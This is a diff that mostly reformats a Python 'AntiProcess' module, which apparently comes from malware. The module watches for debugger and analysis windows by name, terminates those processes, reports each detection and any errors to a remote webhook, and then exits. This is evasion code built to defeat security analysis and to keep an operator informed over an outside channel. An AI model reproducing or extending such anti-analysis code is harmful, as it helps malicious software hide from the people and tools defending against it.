@@ -1,7 +1,7 @@
 import os
 import time
-import psutil
 
+import psutil
 import win32gui
 from win32process import GetWindowThreadProcessId
 
@@ -10,8 +10,9 @@ from ..utils.webhook import Webhook
 
 
 class AntiProcess:
-    def __init__(self, webhook_url: str) -> None:
+    def __init__(self, webhook_url: str, logger) -> None:
         self.webhook_url = webhook_url
+        self.logger = logger
         self.webhook = Webhook(webhook_url)
 
     def CheckProcessList(self) -> None:
@@ -32,18 +33,19 @@ class AntiProcess:
                             os._exit(1)
                         except (psutil.NoSuchProcess, psutil.AccessDenied):
                             pass
-            except:
+            except BaseException:
                 pass
 
     def CheckWindowNames(self) -> None:
         while True:
             try:
                 time.sleep(0.7)
-                window_name = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+                window_name = win32gui.GetWindowText(
+                    win32gui.GetForegroundWindow())
                 if window_name in Lists.BLACKLISTED_WINDOW_NAMES:
                     self.webhook.send(
-                        f"Found `{window_name}` in Window Names", "Anti Process"
-                    )
+                        f"Found `{window_name}` in Window Names",
+                        "Anti Process")
                     os._exit(1)
             except (RuntimeError, NameError, TypeError, OSError) as error:
                 self.webhook.send(f"Error!: ```yaml\n{error}\n```")
@@ -51,22 +53,23 @@ class AntiProcess:
 
     def CheckWindows(self):
         def winEnumHandler(hwnd, ctx):
-            if win32gui.GetWindowText(hwnd).lower() in Lists.BLACKLISTED_WINDOW_NAMES:
+            if win32gui.GetWindowText(hwnd).lower(
+            ) in Lists.BLACKLISTED_WINDOW_NAMES:
                 pid = GetWindowThreadProcessId(hwnd)
-                if type(pid) == int:
+                if isinstance(pid, int):
                     try:
                         psutil.Process(pid).terminate()
-                    except:
+                    except BaseException:
                         pass
                 else:
                     for process in pid:
                         try:
                             psutil.Process(process).terminate()
-                        except:
+                        except BaseException:
                             pass
                 self.webhook.send(
-                    f"Debugger Open: {win32gui.GetWindowText(hwnd)}", "Anti Process"
-                )
+                    f"Debugger Open: {win32gui.GetWindowText(hwnd)}",
+                    "Anti Process")
                 os._exit(1)
 
         while True:
